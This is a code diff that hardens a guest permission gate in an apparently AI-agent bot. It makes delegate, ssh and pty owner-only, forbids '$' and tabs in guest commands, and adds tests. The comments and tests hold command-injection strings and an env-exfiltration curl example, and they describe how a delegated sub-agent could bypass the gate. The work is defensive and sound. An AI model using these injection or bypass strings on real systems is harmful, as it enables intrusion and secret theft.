@@ -39,10 +39,17 @@ impl GuestGate {
     }
 
     /// Tools that are **owner-only**, no matter what `guest_allowed_tools`
-    /// says. These mutate authority itself (who owns the bot / what guests may
-    /// do), so allowing a guest to call one — even by an owner's misconfiguration
-    /// — would be a privilege-escalation hole. Checked before the allowlist.
-    pub const OWNER_ONLY_TOOLS: &'static [&'static str] = &["manage_permissions"];
+    /// says — even if an owner adds one by mistake. Checked before the allowlist.
+    /// Two reasons a tool lands here:
+    ///   * it mutates authority itself (`manage_permissions` — who owns the bot);
+    ///   * it executes code outside this gate's reach, so the guest ceiling
+    ///     can't constrain it:
+    ///       - `delegate` spawns a sub-agent loop with NO guest gate, so any tool
+    ///         the sub-agent is allowed runs unconstrained — a full bypass;
+    ///       - `ssh` / `pty` run arbitrary commands on a remote host / live tmux
+    ///         session and don't carry a glob-checkable single command.
+    pub const OWNER_ONLY_TOOLS: &'static [&'static str] =
+        &["manage_permissions", "delegate", "ssh", "pty"];
 
     /// Whether a guest may invoke `tool` at all. Owner-only tools are always
     /// denied; otherwise the tool must be in the permitted set.
@@ -63,9 +70,14 @@ impl GuestGate {
             return false;
         }
         // Reject any shell metacharacter that could chain, redirect, or inject a
-        // second command — a guest only runs one plain command.
+        // second command — a guest only runs one plain command. Commands run via
+        // `sh -c`, so ANY `$` is rejected: it covers command substitution `$(…)`,
+        // parameter expansion `${…}`/`$VAR` (env exfiltration, e.g.
+        // `curl host?x=$SECRET`), and ANSI-C quoting `$'\n…'` (smuggles control
+        // bytes / separators on shells where /bin/sh is bash). Backticks and the
+        // redirect/chain/subshell operators are blocked alongside.
         const FORBIDDEN: &[&str] = &[
-            "`", "$(", "${", "<(", ">(", "&&", "||", ";", "|", ">", "<", "&", "\n", "\r",
+            "`", "$", "<(", ">(", "&&", "||", ";", "|", ">", "<", "&", "\n", "\r", "\t",
         ];
         if FORBIDDEN.iter().any(|m| cmd.contains(m)) {
             return false;
@@ -180,6 +192,12 @@ mod tests {
         assert!(!g.command_permitted("kubectl get pods | tee /etc/x"));
         assert!(!g.command_permitted("kubectl get pods > /etc/x"));
         assert!(!g.command_permitted("kubectl get $(whoami)"));
+        // any `$` is rejected: command sub, param expansion (env exfil), ANSI-C
+        assert!(!g.command_permitted("kubectl get ${IFS}pods"));
+        assert!(!g.command_permitted("kubectl get $HOME"));
+        assert!(!g.command_permitted("kubectl get $'\\n'pods")); // literal $'\n' in the command string
+                                                                 // tab as a separator is rejected
+        assert!(!g.command_permitted("kubectl get\tpods"));
         assert!(!g.command_permitted(""));
     }
 
@@ -189,12 +207,19 @@ mod tests {
         // allowlist, the hard owner-only denylist still blocks it.
         let g = GuestGate::new(
             ["file_read".to_string()],
-            &["manage_permissions".to_string()],
+            &[
+                "manage_permissions".to_string(),
+                "delegate".to_string(),
+                "ssh".to_string(),
+                "pty".to_string(),
+            ],
             &[],
         );
-        assert!(!g.tool_permitted("manage_permissions"));
-        let reason = g.deny_reason("manage_permissions", &json!({})).unwrap();
-        assert!(reason.contains("owner-only"));
+        for tool in ["manage_permissions", "delegate", "ssh", "pty"] {
+            assert!(!g.tool_permitted(tool), "{tool} must stay owner-only");
+            let reason = g.deny_reason(tool, &json!({})).unwrap();
+            assert!(reason.contains("owner-only"), "{tool}: {reason}");
+        }
     }
 
     #[test]
